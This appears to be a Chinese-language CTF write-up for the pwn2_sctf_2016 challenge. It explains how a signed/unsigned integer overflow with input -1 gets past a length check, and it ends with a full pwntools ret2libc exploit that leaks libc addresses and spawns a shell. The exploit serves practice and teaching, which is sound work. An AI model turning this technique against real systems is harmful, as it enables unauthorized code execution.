## 代码审计

### vuln()函数

    
    
    int vuln()
    {
      char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
      int v2; // [esp+3Ch] [ebp-Ch]
    
      printf("How many bytes do you want me to read? ");
      get_n(nptr, 4);#nptr是输入的参数，4是长度。
      v2 = atoi(nptr);  #把参数nptr所指向的字符串转换为一个整数。
      if ( v2 > 32 )
        return printf("No! That size (%d) is too large!\n", v2);
      printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
      get_n(nptr, v2);
      return printf("You said: %s\n", nptr);
    }
    

### get_n()函数

    
    
    int __cdecl get_n(int a1, unsigned int a2)#a1是输入的参数，a2是输入的长度。
    {
      unsigned int v2; // eax
      int result; // eax
      char v4; // [esp+Bh] [ebp-Dh]
      unsigned int i; // [esp+Ch] [ebp-Ch]
    
      for ( i = 0; ; ++i )#相当于一个while循环类似于while(1){}
      {
        v4 = getchar(); #该函数以无符号 char 强制转换为 int 的形式返回读取的字符，如果到达文件末尾或发生读错误，则返回 EOF。
        if ( !v4 || v4 == 10 || i >= a2 )#
          break;
        v2 = i;
        *(_BYTE *)(v2 + a1) = v4;#从(v2+a1)这个地址中提供的指针取出一个字节要等于v4
      }
      result = a1 + i;
      *(_BYTE *)(a1 + i) = 0;#同理
      return result;
    }
    

a2定义的是`unsigned int`同时a2又是输入的字符长度，get_n()函数会接受a2个长度的字符。

后面判断里a2赋值给了i。判断结构下面i又赋值给了v2。

![get_n函数](https://image.3001.net/images/20211111/1636619721_618cd5c92153dfc7d1699.png!small)

当然这其实不重要，我们重点返回vuln()函数。

![vuln函数](https://image.3001.net/images/20211111/1636619737_618cd5d9d4c0e78e7ac5f.png!small)

这里的v2是int类型。我们可以利用a2`unsigned
int`类型，进行整数溢出来绕过判断。也就是上面说的a2的值赋给了i，i又赋值给了v2。但是在vuln()函数里v2是int类型那么就会造成整数溢出。

大概思路利用-1去进行整数溢出绕过if判断然后利用retlibc3来getshell。  
关于整数溢出漏洞后续会出博客来讲。

### tips

 **unsigned int**

unsigned int是计算机编程语言中一种表示大于等于0的整数类型。

 **取值范围**

16位：0 到 65535

32位：0 到 4294967295

### exp

    
    
    # -*- coding: UTF-8 -*-    #by 小渔xiaoyu
    from pwn import*
    context(os='linux', arch='i386', log_level='debug')
    elf = ELF('./pwn2_sctf_2016')
    sh = elf.process()
    #sh = remote('node4.buuoj.cn',29117)
    printf_got = elf.got['printf']
    printf_plt = elf.plt['printf']
    main_addr = elf.sym['main']
    payload = 'A'*(0x2c+4)+p32(printf_plt)+p32(main_addr)+p32(printf_got)
    sh.recvuntil("How many bytes do you want me to read?")
    sh.sendline('-1')
    sh.recvuntil('\n')
    sh.sendline(payload)
    sh.recvuntil('\n')
    printf_addr = u32(sh.recv(4))
    print('printf_got[+]:',hex(printf_addr))
    
    #leak_libc
    libc = ELF('./libc-2.23.so')
    libc_base = printf_addr - libc.sym['printf']
    system_addr = libc.sym['system']+libc_base
    str_bin_sh_addr = libc.search('/bin/sh').next()+libc_base
    print('str_bin_sh_addr[+]:',hex(str_bin_sh_addr))
    print('system_addr[+]:',hex(system_addr))
    print('libc_base[+]:',hex(libc_base))
    
    #Getshell
    payload = 'A'*(0x2c+4)+p32(system_addr)+p32(main_addr)+p32(str_bin_sh_addr)
    sh.recvuntil("How many bytes do you want me to read?")
    sh.sendline('-1')
    sh.recvuntil('\n')
    sh.sendline(payload)
    sh.interactive()
    

